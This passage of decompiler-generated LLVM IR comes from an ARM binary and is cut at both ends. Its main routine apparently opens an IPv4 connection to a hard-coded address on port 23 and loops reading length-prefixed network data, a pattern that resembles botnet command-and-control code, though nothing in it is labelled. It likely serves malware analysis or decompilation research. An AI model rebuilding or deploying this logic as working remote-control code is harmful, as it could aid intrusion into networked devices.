bb15:                                             ; preds = %dec_label_pc_d94c, %bb14
  ret i32 %v1_d960

; uselistorder directives
  uselistorder i32 %v2_d93c, { 1, 2, 0 }
  uselistorder i32 %v2_d8e0, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d880, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_d968(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_d968:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v15_d968 = load i32, i32* @r8, align 4
  %v2_d974 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d974, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d98c = call i32 @function_11b84(i32* nonnull %stack_var_-64)
  store i32 %v2_d974, i32* @r0, align 4
  %v2_d998 = call i32 @function_11b40(i32 %v2_d974, i32 2)
  %v0_d99c = load i32, i32* @r5, align 4
  store i32 %v0_d99c, i32* %r2.global-to-local, align 4
  %v3_d9a8 = call i32 @function_112d4(i32 %v0_d99c, i32 %v2_d974, i32 %v0_d99c)
  %v2_d9b4 = call i32 @function_11b98(i32 17, i32 1)
  %v2_d9c0 = call i32 @function_11b98(i32 5, i32 54908)
  %v0_d9c4 = call i32 @function_10b08()
  store i32 ptrtoint (i16** @global_var_212e4.76 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_212e8.77, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d9c4, i32* @global_var_212d8.45, align 4
  store i16 5888, i16* bitcast (i32* @global_var_212e6.78 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_212e4.76 to i16*), align 4
  %v6_d9ec = call i32 @function_103ac(i32 %v0_d9c4, i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32 ptrtoint (i16** @global_var_212e4.76 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* %r3.global-to-local, align 4
  store i32 127116, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* inttoptr (i32 127116 to i32*), align 4
  %v1_d9fc = call i32 @function_d694(i32 %v6_d9ec)
  %v1_da00 = call i32 @function_e12c(i32 %v1_d9fc)
  %v2_da08 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_da08, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_da10 = call i32 @function_108e0()
  %v0_da14 = load i32, i32* @r6, align 4
  %v7_da14 = icmp eq i32 %v0_da14, 2
  br i1 %v7_da14, label %dec_label_pc_db4c, label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_db4c, %dec_label_pc_d968, %dec_label_pc_db5c
  %v0_da1c = call i32 @function_e0d0()
  store i32 %v0_da1c, i32* @r6, align 4
  %v0_da24 = load i32, i32* @r8, align 4
  %v1_da24 = inttoptr i32 %v0_da24 to i32*
  %v2_da24 = load i32, i32* %v1_da24, align 4
  %v1_da28 = inttoptr i32 %v2_da24 to i8*
  %v2_da28 = call i32 @function_1084c(i8* %v1_da28)
  %v0_da30 = load i32, i32* @r8, align 4
  %v1_da30 = inttoptr i32 %v0_da30 to i32*
  %v2_da30 = load i32, i32* %v1_da30, align 4
  %v1_da34 = inttoptr i32 %v2_da30 to i8*
  %v2_da34 = call i32 @function_1084c(i8* %v1_da34)
  %v1_da38 = sub i32 20, %v2_da28
  store i32 %v2_da34, i32* @r4, align 4
  %v0_da40 = load i32, i32* @r6, align 4
  %v2_da44 = call i32 @function_10ea4(i32 %v0_da40, i32 %v1_da38)
  %v2_da4c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_da4c, i32* @r5, align 4
  %v0_da50 = load i32, i32* @r4, align 4
  %v2_da50 = add i32 %v0_da50, %v1_da38
  store i32 %v2_da50, i32* @r4, align 4
  %v2_da5c = call i32 @function_e194(i32 %v2_da4c, i32 %v2_da50)
  %v2_da64 = ptrtoint i32* %stack_var_-40 to i32
  %v1_da68 = load i32, i32* @r4, align 4
  %v2_da68 = add i32 %v1_da68, %v2_da64
  store i32 %v2_da68, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_da74 = load i32, i32* @r8, align 4
  %v1_da74 = inttoptr i32 %v0_da74 to i32*
  %v2_da74 = load i32, i32* %v1_da74, align 4
  store i32 %v2_da74, i32* @r0, align 4
  %v3_da78 = add i32 %v2_da68, -64
  %v4_da78 = inttoptr i32 %v3_da78 to i8*
  store i8 0, i8* %v4_da78, align 1
  %v2_da7c = inttoptr i32 %v2_da74 to i8*
  %v3_da7c = call i32 @function_10874(i8* %v2_da7c, i32 %v2_da4c)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da4c, i32* @r0, align 4
  %v0_da88 = call i32 @function_108e0()
  %v0_da8c = call i32 @function_e0d0()
  store i32 %v0_da8c, i32* @r7, align 4
  %v0_da94 = load i32, i32* @r8, align 4
  %v1_da94 = inttoptr i32 %v0_da94 to i32*
  %v2_da94 = load i32, i32* %v1_da94, align 4
  %v1_da98 = inttoptr i32 %v2_da94 to i8*
  %v2_da98 = call i32 @function_1084c(i8* %v1_da98)
  store i32 %v2_da98, i32* @r6, align 4
  %v0_daa0 = load i32, i32* @r8, align 4
  %v1_daa0 = inttoptr i32 %v0_daa0 to i32*
  %v2_daa0 = load i32, i32* %v1_daa0, align 4
  %v1_daa4 = inttoptr i32 %v2_daa0 to i8*
  %v2_daa4 = call i32 @function_1084c(i8* %v1_daa4)
  %v0_daa8 = load i32, i32* @r6, align 4
  %v1_daa8 = sub i32 20, %v0_daa8
  store i32 %v2_daa4, i32* @r4, align 4
  %v0_dab0 = load i32, i32* @r7, align 4
  %v2_dab4 = call i32 @function_10ea4(i32 %v0_dab0, i32 %v1_daa8)
  %v0_dab8 = load i32, i32* @r4, align 4
  %v2_dab8 = add i32 %v0_dab8, %v1_daa8
  store i32 %v2_dab8, i32* @r4, align 4
  %v2_dac4 = call i32 @function_e194(i32 %v2_da4c, i32 %v2_dab8)
  store i32 %v2_da64, i32* %r2.global-to-local, align 4
  %v1_dad0 = load i32, i32* @r4, align 4
  %v2_dad0 = add i32 %v1_dad0, %v2_da64
  store i32 %v2_dad0, i32* %r3.global-to-local, align 4
  %v0_dad4 = load i32, i32* @sb, align 4
  %v1_dad4 = trunc i32 %v0_dad4 to i8
  %v3_dad4 = add i32 %v2_dad0, -64
  %v4_dad4 = inttoptr i32 %v3_dad4 to i8*
  store i8 %v1_dad4, i8* %v4_dad4, align 1
  %v4_dae0 = call i32 @function_10fbc(i32 15, i32 %v2_da4c, i32 %v2_da64, i32 %v2_dad0)
  %v1_dae8 = call i32 @function_1030c(i32 3)
  %v3_daf4 = call i32 @function_10248(i32 3, i32* nonnull %stack_var_-48)
  %v3_daf8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_daf8, i32* %r2.global-to-local, align 4
  %v2_db04 = call i32 @function_11218(i32 1, i32 %v3_daf4)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_db14 = call i32 @function_11218(i32 1, i32 ptrtoint (i32* @global_var_166a8.90 to i32))
  %v1_db1c = call i32 @function_1026c(i32 3)
  %v1_db20 = call i32 @function_85e0(i32 %v1_db1c)
  %v1_db24 = call i32 @function_ced0(i32 %v1_db20)
  store i32 %v1_db24, i32* @r0, align 4
  %v1_db28 = call i32 @function_d878(i32 %v1_db24)
  store i32 %v1_db28, i32* @r0, align 4
  %v0_db2c = call i32 @function_10ffc()
  %v1_db30 = load i32, i32* @sb, align 4
  %v7_db34 = icmp sgt i32 %v0_db2c, %v1_db30
  br i1 %v7_db34, label %dec_label_pc_db38, label %dec_label_pc_db88

dec_label_pc_db38:                                ; preds = %dec_label_pc_da1c
  store i32 %v15_d968, i32* %r8.global-to-local, align 4
  ret i32 %v1_db30

dec_label_pc_db4c:                                ; preds = %dec_label_pc_d968
  %v0_db4c = load i32, i32* @r8, align 4
  %v1_db4c = add i32 %v0_db4c, 4
  %v2_db4c = inttoptr i32 %v1_db4c to i32*
  %v3_db4c = load i32, i32* %v2_db4c, align 4
  %v1_db50 = inttoptr i32 %v3_db4c to i8*
  %v2_db50 = call i32 @function_1084c(i8* %v1_db50)
  %v8_db58 = icmp sgt i32 %v2_db50, 31
  br i1 %v8_db58, label %dec_label_pc_da1c, label %dec_label_pc_db5c

dec_label_pc_db5c:                                ; preds = %dec_label_pc_db4c
  %v0_db60 = load i32, i32* @r8, align 4
  %v1_db60 = add i32 %v0_db60, 4
  %v2_db60 = inttoptr i32 %v1_db60 to i32*
  %v3_db60 = load i32, i32* %v2_db60, align 4
  store i32 %v2_da08, i32* @r0, align 4
  %v2_db68 = bitcast i32* %stack_var_-136 to i8*
  %v3_db68 = call i32 @function_10874(i8* %v2_db68, i32 %v3_db60)
  %v0_db6c = load i32, i32* @r8, align 4
  %v1_db6c = add i32 %v0_db6c, 4
  %v2_db6c = inttoptr i32 %v1_db6c to i32*
  %v3_db6c = load i32, i32* %v2_db6c, align 4
  %v1_db74 = inttoptr i32 %v3_db6c to i8*
  %v2_db74 = call i32 @function_1084c(i8* %v1_db74)
  store i32 %v2_db74, i32* @r1, align 4
  store i32 %v3_db6c, i32* @r0, align 4
  %v0_db80 = call i32 @function_108e0()
  br label %dec_label_pc_da1c

dec_label_pc_db88:                                ; preds = %dec_label_pc_da1c
  %v1_db88 = call i32 @function_1124c(i32 %v0_db2c)
  %v0_db8c = load i32, i32* @sb, align 4
  %v1_db90 = call i32 @function_1130c(i32 %v0_db8c)
  %v1_db98 = call i32 @function_1130c(i32 1)
  %v1_dba0 = call i32 @function_1130c(i32 2)
  %v1_dba4 = call i32 @function_85e0(i32 %v1_dba0)
  %v1_dba8 = call i32 @function_ced0(i32 %v1_dba4)
  store i32 %v1_dba8, i32* @r0, align 4
  %v1_dbac = call i32 @function_d878(i32 %v1_dba8)
  store i32 %v1_dbac, i32* @r0, align 4
  %v1_dbb0 = call i32 @function_ea90(i32 %v1_dbac)
  store i32 127108, i32* @fp, align 4
  store i32 127112, i32* @sl, align 4
  %v2_dbc4 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_dbc4, i32* @r6, align 4
  %v2_dbc8 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_dbc8, i32* @r7, align 4
  %v2_dca8 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dcf0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_dfb8 = ptrtoint i8** %stack_var_-42 to i32
  %v2_de50 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_df48 = ptrtoint i32* %stack_var_-52 to i32
  %v2_df4c = ptrtoint i32* %stack_var_-56 to i32
  %v1_e008 = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_dbcc

dec_label_pc_dbcc:                                ; preds = %dec_label_pc_dfcc, %dec_label_pc_e000, %bb44, %dec_label_pc_de68, %dec_label_pc_ddac, %dec_label_pc_dd9c, %bb41, %dec_label_pc_e088, %dec_label_pc_e06c, %dec_label_pc_e054, %dec_label_pc_dfdc, %dec_label_pc_df74, %dec_label_pc_dec0, %dec_label_pc_dd50, %dec_label_pc_db88
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbd8

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbd8, %dec_label_pc_dbcc
  %v1_dbdc = phi i32 [ %v1_dbe0, %dec_label_pc_dbd8 ], [ 4, %dec_label_pc_dbcc ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dbdc = load i32, i32* @r6, align 4
  %v3_dbdc = add i32 %v2_dbdc, %v1_dbdc
  %v4_dbdc = inttoptr i32 %v3_dbdc to i32*
  store i32 0, i32* %v4_dbdc, align 4
  %v0_dbe0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dbe0 = add i32 %v0_dbe0, 4
  store i32 %v1_dbe0, i32* %r3.global-to-local, align 4
  %v7_dbe4 = icmp eq i32 %v1_dbe0, 128
  br i1 %v7_dbe4, label %dec_label_pc_dbec, label %dec_label_pc_dbd8

dec_label_pc_dbec:                                ; preds = %dec_label_pc_dbd8
  %v0_dbec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dbec, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbf4, %dec_label_pc_dbec
  %v1_dbf8 = phi i32 [ %v1_dbfc, %dec_label_pc_dbf4 ], [ 4, %dec_label_pc_dbec ]
  store i32 0, i32* @r4, align 4
  %v2_dbf8 = load i32, i32* @r7, align 4
  %v3_dbf8 = add i32 %v2_dbf8, %v1_dbf8
  %v4_dbf8 = inttoptr i32 %v3_dbf8 to i32*
  store i32 0, i32* %v4_dbf8, align 4
  %v0_dbfc = load i32, i32* %r3.global-to-local, align 4
  %v1_dbfc = add i32 %v0_dbfc, 4
  store i32 %v1_dbfc, i32* %r3.global-to-local, align 4
  %v7_dc00 = icmp eq i32 %v1_dbfc, 128
  br i1 %v7_dc00, label %dec_label_pc_dc08, label %dec_label_pc_dbf4

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dbf4
  %v0_dc08 = load i32, i32* @fp, align 4
  %v1_dc08 = inttoptr i32 %v0_dc08 to i32*
  %v2_dc08 = load i32, i32* %v1_dc08, align 4
  %v7_dc0c = icmp eq i32 %v2_dc08, -1
  br i1 %v7_dc0c, label %dec_label_pc_dc3c, label %dec_label_pc_dc14

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dc08
  %v3_dc14 = udiv i32 %v2_dc08, 32
  %v3_dc1c = mul nuw nsw i32 %v3_dc14, 4
  store i32 %v2_da64, i32* %ip.global-to-local, align 4
  %v2_dc24 = add i32 %v3_dc1c, %v2_da64
  store i32 %v2_dc24, i32* %r3.global-to-local, align 4
  %v1_dc28 = add i32 %v2_dc24, -224
  %v2_dc28 = inttoptr i32 %v1_dc28 to i32*
  %v3_dc28 = load i32, i32* %v2_dc28, align 4
  %v1_dc2c = urem i32 %v2_dc08, 32
  %v7_dc34 = shl i32 1, %v1_dc2c
  %v8_dc34 = or i32 %v3_dc28, %v7_dc34
  store i32 %v8_dc34, i32* %r2.global-to-local, align 4
  store i32 %v8_dc34, i32* %v2_dc28, align 4
  br label %dec_label_pc_dc3c

dec_label_pc_dc3c:                                ; preds = %dec_label_pc_dc08, %dec_label_pc_dc14
  %v0_dc3c = load i32, i32* @sl, align 4
  %v1_dc3c = inttoptr i32 %v0_dc3c to i32*
  %v2_dc3c = load i32, i32* %v1_dc3c, align 4
  store i32 %v2_dc3c, i32* @r3, align 4
  %v7_dc40 = icmp eq i32 %v2_dc3c, -1
  store i32 127112, i32* %r8.global-to-local, align 4
  br i1 %v7_dc40, label %dec_label_pc_decc, label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_decc, %dec_label_pc_dc3c, %bb43
  %v2_dc50 = load i8, i8* bitcast (i8** @global_var_1f25c.94 to i8*), align 4
  %v3_dc50 = zext i8 %v2_dc50 to i32
  store i32 %v3_dc50, i32* %r3.global-to-local, align 4
  %v2_dc54 = icmp eq i8 %v2_dc50, 0
  %v0_dd6c = load i32, i32* @sl, align 4
  %v1_dd6c = inttoptr i32 %v0_dd6c to i32*
  %v2_dd6c = load i32, i32* %v1_dd6c, align 4
  store i32 %v2_dd6c, i32* %ip.global-to-local, align 4
  %v3_dd74 = udiv i32 %v2_dd6c, 32
  br i1 %v2_dc54, label %dec_label_pc_dd6c, label %dec_label_pc_dc5c

dec_label_pc_dc5c:                                ; preds = %dec_label_pc_dc4c
  %v3_dc6c = mul nuw nsw i32 %v3_dd74, 4
  %v2_dc70 = add i32 %v3_dc6c, %v2_da64
  store i32 %v2_dc70, i32* %r3.global-to-local, align 4
  %v1_dc74 = add i32 %v2_dc70, -352
  %v2_dc74 = inttoptr i32 %v1_dc74 to i32*
  %v3_dc74 = load i32, i32* %v2_dc74, align 4
  %v1_dc78 = urem i32 %v2_dd6c, 32
  %v7_dc80 = shl i32 1, %v1_dc78
  %v8_dc80 = or i32 %v3_dc74, %v7_dc80
  store i32 %v8_dc80, i32* %r2.global-to-local, align 4
  store i32 %v8_dc80, i32* %v2_dc74, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dd6c, %dec_label_pc_dc5c
  %v0_dc88 = load i32, i32* @fp, align 4
  %v1_dc88 = inttoptr i32 %v0_dc88 to i32*
  %v2_dc88 = load i32, i32* %v1_dc88, align 4
  %v0_dc8c = load i32, i32* %ip.global-to-local, align 4
  %v5_dc90 = icmp slt i32 %v0_dc8c, %v2_dc88
  br i1 %v5_dc90, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_dc88
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_dc88, %bb
  %v0_dcac = phi i32 [ %v2_dc88, %dec_label_pc_dc88 ], [ %v0_dc8c, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dca8, i32* %ip.global-to-local, align 4
  %v1_dcac = add i32 %v0_dcac, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dbc8, i32* %r2.global-to-local, align 4
  %v5_dcc4 = call i32 @function_11030(i32 %v1_dcac, i32 %v2_dbc4, i32 %v2_dbc8, i32 0, i32 %v2_dca8)
  %v8_dcc8 = icmp eq i32 %v5_dcc4, -1
  br i1 %v8_dcc8, label %dec_label_pc_dbcc, label %dec_label_pc_dcd0

dec_label_pc_dcd0:                                ; preds = %bb41
  %v6_dcc4 = trunc i32 %v5_dcc4 to i16
  %v3_dcd0 = icmp eq i16 %v6_dcc4, 0
  br i1 %v3_dcd0, label %dec_label_pc_dcd8, label %dec_label_pc_dd04

dec_label_pc_dcd8:                                ; preds = %dec_label_pc_dcd0
  %v2_dcdc = load i32, i32* @sb, align 4
  %v5_dce0 = srem i32 %v2_dcdc, 6
  %v4_dce8 = sub i32 %v2_dcdc, %v5_dce0
  store i32 %v4_dce8, i32* %r3.global-to-local, align 4
  store i32 %v5_dce0, i32* %r2.global-to-local, align 4
  %v2_dcf4 = icmp eq i32 %v5_dce0, 0
  %v7_dcf8 = inttoptr i32 %v5_dcc4 to i8*
  store i8* %v7_dcf8, i8** %stack_var_-42, align 4
  %v1_dcfc = add i32 %v2_dcdc, 1
  store i32 %v1_dcfc, i32* @sb, align 4
  br i1 %v2_dcf4, label %dec_label_pc_dfb0, label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %dec_label_pc_dcd0, %dec_label_pc_dcd8, %dec_label_pc_dfb0
  store i32 ptrtoint (i8** @global_var_1f25c.94 to i32), i32* %r2.global-to-local, align 4
  %v2_dd08 = load i8, i8* bitcast (i8** @global_var_1f25c.94 to i8*), align 4
  %v3_dd08 = zext i8 %v2_dd08 to i32
  store i32 %v3_dd08, i32* @r4, align 4
  %v2_dd0c = icmp eq i8 %v2_dd08, 0
  %v0_dd9c = load i32, i32* @sl, align 4
  %v1_dd9c = inttoptr i32 %v0_dd9c to i32*
  %v2_dd9c = load i32, i32* %v1_dd9c, align 4
  br i1 %v2_dd0c, label %dec_label_pc_dd9c, label %dec_label_pc_dd14

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dd04
  %v3_dd1c = udiv i32 %v2_dd9c, 32
  store i32 %v2_da64, i32* %ip.global-to-local, align 4
  %v3_dd24 = mul nuw nsw i32 %v3_dd1c, 4
  %v2_dd28 = add i32 %v3_dd24, %v2_da64
  store i32 %v2_dd28, i32* %r3.global-to-local, align 4
  %v1_dd2c = add i32 %v2_dd28, -352
  %v2_dd2c = inttoptr i32 %v1_dd2c to i32*
  %v3_dd2c = load i32, i32* %v2_dd2c, align 4
  %v1_dd30 = urem i32 %v2_dd9c, 32
  %v6_dd34 = lshr i32 %v3_dd2c, %v1_dd30
  store i32 %v6_dd34, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1f25c.94 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd40 = urem i32 %v6_dd34, 2
  %v2_dd40 = icmp eq i32 %v1_dd40, 0
  store i8 0, i8* bitcast (i8** @global_var_1f25c.94 to i8*), align 4
  store i32 127112, i32* @r4, align 4
  br i1 %v2_dd40, label %dec_label_pc_dd50, label %dec_label_pc_df3c

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd14
  store i32 56664, i32* @lr, align 4
  %v1_dd54 = icmp ne i32 %v2_dd9c, -1
  call void @__pseudo_cond_branch(i1 %v1_dd54, i32 ptrtoint (i32* @global_var_1130c.96 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd5c = load i32, i32* @r4, align 4
  %v2_dd5c = inttoptr i32 %v1_dd5c to i32*
  store i32 -1, i32* %v2_dd5c, align 4
  %v1_dd64 = call i32 @function_133f8(i32 1)
  br label %dec_label_pc_dbcc

dec_label_pc_dd6c:                                ; preds = %dec_label_pc_dc4c
  store i32 %v2_da64, i32* %r2.global-to-local, align 4
  %v3_dd7c = mul nuw nsw i32 %v3_dd74, 4
  %v2_dd80 = add i32 %v3_dd7c, %v2_da64
  store i32 %v2_dd80, i32* %r3.global-to-local, align 4
  %v1_dd84 = add i32 %v2_dd80, -224
  %v2_dd84 = inttoptr i32 %v1_dd84 to i32*
  %v3_dd84 = load i32, i32* %v2_dd84, align 4
  %v1_dd88 = urem i32 %v2_dd6c, 32
  %v7_dd90 = shl i32 1, %v1_dd88
  %v8_dd90 = or i32 %v3_dd84, %v7_dd90
  store i32 %v8_dd90, i32* %r2.global-to-local, align 4
  store i32 %v8_dd90, i32* %v2_dd84, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dd04
  %v7_dda0 = icmp eq i32 %v2_dd9c, -1
  store i32 127112, i32* @r8, align 4
  br i1 %v7_dda0, label %dec_label_pc_dbcc, label %dec_label_pc_ddac

dec_label_pc_ddac:                                ; preds = %dec_label_pc_dd9c
  %v3_ddac = udiv i32 %v2_dd9c, 32
  %v3_ddb4 = mul nuw nsw i32 %v3_ddac, 4
  store i32 %v2_da64, i32* %ip.global-to-local, align 4
  %v2_ddbc = add i32 %v3_ddb4, %v2_da64
  store i32 %v2_ddbc, i32* %r3.global-to-local, align 4
  %v1_ddc0 = add i32 %v2_ddbc, -224
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i32*
  %v3_ddc0 = load i32, i32* %v2_ddc0, align 4
  %v1_ddc4 = urem i32 %v2_dd9c, 32
  %v6_ddc8 = lshr i32 %v3_ddc0, %v1_ddc4
  store i32 %v6_ddc8, i32* %r2.global-to-local, align 4
  %v1_ddcc = urem i32 %v6_ddc8, 2
  %v2_ddcc = icmp eq i32 %v1_ddcc, 0
  br i1 %v2_ddcc, label %dec_label_pc_dbcc, label %dec_label_pc_ddd4

dec_label_pc_ddd4:                                ; preds = %dec_label_pc_ddac
  %v6_ddd8 = inttoptr i32 %v3_dd08 to i8*
  store i8* %v6_ddd8, i8** %stack_var_-42, align 4
  %v0_dddc = call i32 @function_11734()
  %v0_dde0 = load i32, i32* @r4, align 4
  %v2_dde0 = inttoptr i32 %v0_dddc to i32*
  store i32 %v0_dde0, i32* %v2_dde0, align 4
  store i32 %v0_dddc, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_ddf4 = load i32, i32* @r8, align 4
  %v1_ddf4 = inttoptr i32 %v0_ddf4 to i32*
  %v2_ddf4 = load i32, i32* %v1_ddf4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_de00 = call i32 @function_119bc(i32 %v2_ddf4, i32 %v2_dfb8, i32 2, i32 16386)
  %v7_de04 = icmp eq i32 %v4_de00, -1
  br i1 %v7_de04, label %dec_label_pc_dfcc, label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_ddd4
  %v2_de0c = icmp eq i32 %v4_de00, 0
  br i1 %v2_de0c, label %dec_label_pc_dfdc, label %dec_label_pc_de14

dec_label_pc_de14:                                ; preds = %dec_label_pc_de0c
  %v3_de18 = load i8*, i8** %stack_var_-42, align 4
  %v4_de18 = ptrtoint i8* %v3_de18 to i32
  store i32 %v4_de18, i32* %r3.global-to-local, align 4
  %v2_de1c = icmp eq i8* %v3_de18, null
  br i1 %v2_de1c, label %dec_label_pc_e06c, label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %dec_label_pc_de14
  %v3_de24 = udiv i32 %v4_de18, 256
  %v1_de28 = mul i32 %v4_de18, 256
  %v4_de2c = and i32 %v1_de28, 65280
  %v5_de2c = or i32 %v4_de2c, %v3_de24
  %v6_de2c = trunc i32 %v5_de2c to i16
  store i32 %v5_de2c, i32* %r2.global-to-local, align 4
  store i32 %v2_dcf0, i32* %r3.global-to-local, align 4
  %v7_de38 = inttoptr i32 %v5_de2c to i8*
  store i8* %v7_de38, i8** %stack_var_-42, align 4
  %tmp45 = icmp ugt i16 %v6_de2c, 1024
  br i1 %tmp45, label %dec_label_pc_e088, label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %dec_label_pc_de24
  %v0_de40 = load i32, i32* @r4, align 4
  %v1_de40 = load i32, i32* @r5, align 4
  %v2_de40 = inttoptr i32 %v1_de40 to i32*
  store i32 %v0_de40, i32* %v2_de40, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_de4c = load i32, i32* @r8, align 4
  %v1_de4c = inttoptr i32 %v0_de4c to i32*
  %v2_de4c = load i32, i32* %v1_de4c, align 4
  %v7_de54 = call i32 @function_119bc(i32 %v2_de4c, i32 %v2_de50, i32 %v5_de2c, i32 16386)
  %v7_de58 = icmp eq i32 %v7_de54, -1
  br i1 %v7_de58, label %dec_label_pc_dfcc, label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de40
  %v2_de60 = icmp eq i32 %v7_de54, 0
  br i1 %v2_de60, label %dec_label_pc_dfdc, label %dec_label_pc_de68

dec_label_pc_de68:                                ; preds = %dec_label_pc_de60
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_de78 = load i32, i32* @r8, align 4
  %v1_de78 = inttoptr i32 %v0_de78 to i32*
  %v2_de78 = load i32, i32* %v1_de78, align 4
  %v4_de7c = call i32 @function_119bc(i32 %v2_de78, i32 %v2_dfb8, i32 2, i32 16384)
  %v3_de84 = load i8*, i8** %stack_var_-42, align 4
  %v4_de84 = ptrtoint i8* %v3_de84 to i32
  %v3_de88 = udiv i32 %v4_de84, 256
  %v1_de8c = urem i32 %v4_de84, 256
  store i32 %v1_de8c, i32* %r3.global-to-local, align 4
  %v4_de90 = mul nuw nsw i32 %v1_de8c, 256
  %v5_de90 = or i32 %v4_de90, %v3_de88
  store i32 %v5_de90, i32* %ip.global-to-local, align 4
  store i32 %v2_dcf0, i32* @lr, align 4
  store i32 %v5_de90, i32* %r2.global-to-local, align 4
  %v0_dea0 = load i32, i32* @r8, align 4
  %v1_dea0 = inttoptr i32 %v0_dea0 to i32*
  %v2_dea0 = load i32, i32* %v1_dea0, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dea8 = inttoptr i32 %v5_de90 to i8*
  store i8* %v6_dea8, i8** %stack_var_-42, align 4
  %v6_deac = call i32 @function_119bc(i32 %v2_dea0, i32 %v2_de50, i32 %v5_de90, i32 16384)
  store i32 %v2_dcf0, i32* %r2.global-to-local, align 4
  %v3_deb4 = load i8*, i8** %stack_var_-42, align 4
  %v3_deb8 = icmp eq i8* %v3_deb4, null
  br i1 %v3_deb8, label %dec_label_pc_dbcc, label %dec_label_pc_dec0

dec_label_pc_dec0:                                ; preds = %dec_label_pc_de68
  %v4_deb4 = ptrtoint i8* %v3_deb4 to i32
  %v5_dec4 = call i32 @function_82e8(i32* nonnull %stack_var_-1416, i32 %v4_deb4, i32 %v2_dcf0)
  br label %dec_label_pc_dbcc

dec_label_pc_decc:                                ; preds = %dec_label_pc_dc3c
  %v0_ded4 = load i32, i32* @r4, align 4
  store i32 %v0_ded4, i32* %r2.global-to-local, align 4
  %v3_ded8 = call i32 @function_11aec(i32 2, i32 1, i32 %v0_ded4)
  %v7_dedc = icmp eq i32 %v3_ded8, -1
  store i32 %v3_ded8, i32* @r5, align 4
  %v1_dee4 = load i32, i32* %r8.global-to-local, align 4
  %v2_dee4 = inttoptr i32 %v1_dee4 to i32*
  store i32 %v3_ded8, i32* %v2_dee4, align 4
  br i1 %v7_dedc, label %dec_label_pc_dc4c, label %dec_label_pc_deec

dec_label_pc_deec:                                ; preds = %dec_label_pc_decc
